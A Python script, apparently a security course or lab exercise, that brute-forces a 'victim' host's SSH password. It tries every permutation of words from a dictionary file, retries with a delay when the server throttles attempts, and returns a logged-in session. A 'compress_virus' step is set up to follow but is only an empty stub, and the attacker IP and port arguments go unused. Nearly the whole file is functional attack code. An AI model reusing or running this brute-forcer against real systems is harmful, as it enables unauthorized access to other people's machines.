#!/usr/bin/env python3

import sys
import time
import socket
import paramiko
from itertools import permutations


class colors:
    CEND    = '\033[0m'
    FAIL    = '\033[91m'
    SUCCESS = '\033[92m'
    WARNING = '\033[93m'
    INFO    = '\033[94m'


def disable_traceback_print():
    sys.tracebacklimit = 0


def get_parameters():
    if len(sys.argv) != 4:
        print(f"usage: {__file__} <Victim IP> <Attacker IP> <Attacker port>")
        exit(-1)
    return sys.argv[1:]


def get_words():
    with open("/home/csc2023/materials/victim.dat", "r") as file:
        dictionary = file.read().splitlines()
        return dictionary


def try_ssh_connect(victim_ip, password):
    username = "csc2023"
    client   = paramiko.SSHClient()                                 # initialize SSH client
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())    # add to know hosts
    try:
        client.connect(hostname=victim_ip, username=username, password=password, timeout=5)
    except socket.timeout: 
        print(f"{colors.FAIL}[!] Timeout: {victim_ip} is unreachable, password is {password}{colors.CEND}")
        return False
    except paramiko.ssh_exception.NoValidConnectionsError: 
        print(f"{colors.FAIL}[!] No valid connection: SSH connection cannot be established, password is {password}{colors.CEND}")
        return False
    except paramiko.AuthenticationException:
        print(f"{colors.INFO}[!] Incorrect password: {password} is invalid for {username}{colors.CEND}")
        return False
    except paramiko.ssh_exception.SSHException as SSHException:
        print(f"{colors.WARNING}[!] SSH Exception: {SSHException}{colors.CEND}")
        print(f"{colors.WARNING}[!] Quota exceed, retrying with delay ...{colors.CEND}")
        time.sleep(10)
        return try_ssh_connect(victim_ip, password)
    else:
        print(f"{colors.SUCCESS}[!] Correct password: The password of {username} is {password}{colors.CEND}")
        return client


def crack_ssh_password(victim_ip, dictionary):
    for i in range (1, len(dictionary) + 1):
        for combination in list(permutations(dictionary, i)):
            password = "".join(combination)
            victim = try_ssh_connect(victim_ip, password)
            if victim: return victim
    print(f"{colors.FAIL}[!] Cannot find the correct password{colors.CEND}")
    exit(-1)


def compress_virus(victim):
    # stdin, stdout, stderr = victim.exec_command("ls -a")
    # print(stdout.read().decode())
    pass


def main():
    disable_traceback_print()
    victim_ip, attacker_ip, attacker_port = get_parameters()
    dictionary = get_words()
    victim = crack_ssh_password(victim_ip, dictionary)
    compress_virus(victim)
    victim.close()
        

if __name__ == '__main__':
    main()
